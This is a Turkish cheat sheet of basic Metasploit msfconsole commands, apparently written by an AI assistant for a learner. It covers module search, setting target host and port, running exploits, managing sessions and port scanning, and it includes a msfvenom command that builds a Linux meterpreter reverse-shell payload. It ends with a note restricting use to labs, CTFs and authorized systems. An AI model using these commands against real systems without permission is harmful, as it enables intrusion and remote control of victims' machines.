Aşağıda **Metasploit Framework (msfconsole)** içinde en çok kullanılan komutları “not alabileceğin” şekilde topladım:

---

# 💥 Metasploit Framework Komutları (msfconsole NOT)

## 🟢 Genel komutlar

```bash id="g1"
help
```

👉 Tüm komutları gösterir

```bash id="g2"
version
```

👉 Metasploit sürümünü gösterir

```bash id="g3"
banner
```

👉 Başlangıç ekranını değiştirir

```bash id="g4"
exit
```

👉 msfconsole’dan çıkar

---

## 🔍 Arama ve modül kullanma

```bash id="s1"
search exploit_name
```

👉 Exploit / module arar

```bash id="s2"
use exploit/...
```

👉 Modül seçer

```bash id="s3"
info
```

👉 Seçilen modül hakkında bilgi verir

```bash id="s4"
show options
```

👉 Gerekli parametreleri gösterir

```bash id="s5"
show payloads
```

👉 Kullanılabilir payload’ları listeler

---

## ⚙️ Ayarlama komutları

```bash id="a1"
set RHOST 192.168.1.10
```

👉 Hedef IP

```bash id="a2"
set RPORT 80
```

👉 Hedef port

```bash id="a3"
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

👉 Payload seçimi

```bash id="a4"
unset RHOST
```

👉 Ayarı siler

```bash id="a5"
show options
```

👉 Tekrar kontrol

---

## 🚀 Exploit çalıştırma

```bash id="e1"
exploit
```

👉 Saldırıyı başlatır

```bash id="e2"
run
```

👉 Alternatif çalıştırma komutu

---

## 🎯 Session yönetimi

```bash id="m1"
sessions -l
```

👉 Açık bağlantıları listeler

```bash id="m2"
sessions -i 1
```

👉 Session’a bağlanır

```bash id="m3"
sessions -k 1
```

👉 Session kapatır

```bash id="m4"
background
```

👉 Session’ı arka plana atar

---

## 🔎 Tarama modülleri

```bash id="t1"
use auxiliary/scanner/portscan/tcp
```

👉 Port tarama

```bash id="t2"
use auxiliary/scanner/http/http_version
```

👉 HTTP servis tespiti

---

## 💣 Payload oluşturma

```bash id="p1"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf
```

👉 Zararlı payload üretme

---

## 🧠 KISA ÖZET

* search → modül bul
* use → modül seç
* set → ayar yap
* exploit/run → saldırı başlat
* sessions → bağlantıları yönet

---

## ⚠️ ÖNEMLİ

* Sadece lab / CTF / izinli sistemlerde kullanılır
* İzinsiz kullanım yasa dışıdır


